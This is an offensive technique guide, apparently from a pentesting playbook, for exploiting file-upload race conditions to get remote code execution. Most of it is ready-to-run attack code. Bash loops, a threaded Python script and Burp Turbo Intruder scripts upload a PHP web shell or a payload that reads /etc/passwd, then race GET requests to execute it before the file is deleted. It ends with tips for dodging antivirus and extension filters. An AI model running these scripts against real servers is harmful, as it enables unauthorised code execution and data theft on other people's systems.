# File Upload — Race Condition Exploitation

## When this applies

- Server saves the file to its serving directory FIRST and validates / virus-scans AFTER.
- File is reachable via HTTP between the save and the deletion (if validation rejects it).
- Goal: race repeated GETs against the post-upload deletion.

## Technique

Upload the malicious file, fire 5+ GETs to its URL with the same gate. One GET will land in the window between save and delete and serve the file, granting RCE / file read.

**Attack window**: Time between upload and deletion.

## Steps

### Manual race condition attack

```bash
# Terminal 1: Continuous upload
while true; do
  curl -X POST -F "file=@shell.php" http://target.com/upload
  sleep 0.1
done

# Terminal 2: Continuous access attempt
while true; do
  curl http://target.com/uploads/shell.php?cmd=whoami
  sleep 0.1
done
```

### Burp Suite Repeater workflow

```
1. Capture POST upload request (shell.php)
2. Send to Repeater
3. Capture GET request to uploaded file path
4. Send to Repeater
5. Arrange windows side-by-side
6. Rapidly alternate: POST -> GET -> POST -> GET
7. Some GET requests will execute before deletion
```

### Burp Turbo Intruder script — basic

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    # POST request to upload shell.php
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=<YOUR-SESSION>

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

testuser
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

<CSRF-TOKEN>
------WebKitFormBoundary--
'''

    # GET request to execute uploaded file
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: target.com
Cookie: session=<YOUR-SESSION>

'''

    # Queue requests with gate synchronization
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Open gate - all requests sent simultaneously
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### Multi-threaded version

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)

    upload_request = '''<UPLOAD-REQUEST>'''
    access_request = '''<ACCESS-REQUEST>'''

    # Send 100 requests in parallel
    for i in range(50):
        engine.queue(upload_request, gate='race1')
        engine.queue(access_request, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    if '200 OK' in req.response and len(req.response) > 500:
        table.add(req)
```

### Python race condition script

```python
import requests
import threading

target = "http://target.com"
upload_url = f"{target}/upload"
access_url = f"{target}/uploads/shell.php"

def upload_file():
    files = {'file': open('shell.php', 'rb')}
    while True:
        try:
            requests.post(upload_url, files=files)
        except:
            pass

def access_file():
    while True:
        try:
            r = requests.get(f"{access_url}?cmd=id")
            if r.status_code == 200 and 'uid=' in r.text:
                print("[+] Success!")
                print(r.text)
                exit(0)
        except:
            pass

# Start 10 upload threads
for i in range(10):
    threading.Thread(target=upload_file).start()

# Start 10 access threads
for i in range(10):
    threading.Thread(target=access_file).start()
```

### Bash race condition script

```bash
#!/bin/bash

TARGET="http://target.com"
UPLOAD_URL="$TARGET/upload"
ACCESS_URL="$TARGET/uploads/shell.php"

# Upload function
upload() {
    while true; do
        curl -s -X POST -F "file=@shell.php" $UPLOAD_URL &
    done
}

# Access function
access() {
    while true; do
        RESULT=$(curl -s "$ACCESS_URL?cmd=id")
        if [[ $RESULT == *"uid="* ]]; then
            echo "[+] Success: $RESULT"
            killall curl
            exit 0
        fi
    done
}

# Start 5 upload processes
for i in {1..5}; do
    upload &
done

# Start 5 access processes
for i in {1..5}; do
    access &
done

wait
```

## Verifying success

- One of the GET responses contains the rendered file output (`uid=...`, `/etc/passwd` content).
- Other GETs return 404 — confirming the file was deleted shortly after.
- Re-running the attack reproduces the success rate.

## Common pitfalls

- Some servers serve static files via a separate process (nginx) that doesn't see the deletion immediately — the GET window can be larger than expected.
- AV scanners may block the upload entirely (no save) — try non-AV-flagged payloads.
- File extensions matter: `.php` may be rewritten or denied; try `.phtml`, `.php5`, `.phar`.

## Tools

- Burp Turbo Intruder
- Burp Suite Repeater
- Burp Collaborator
- threading + requests in Python
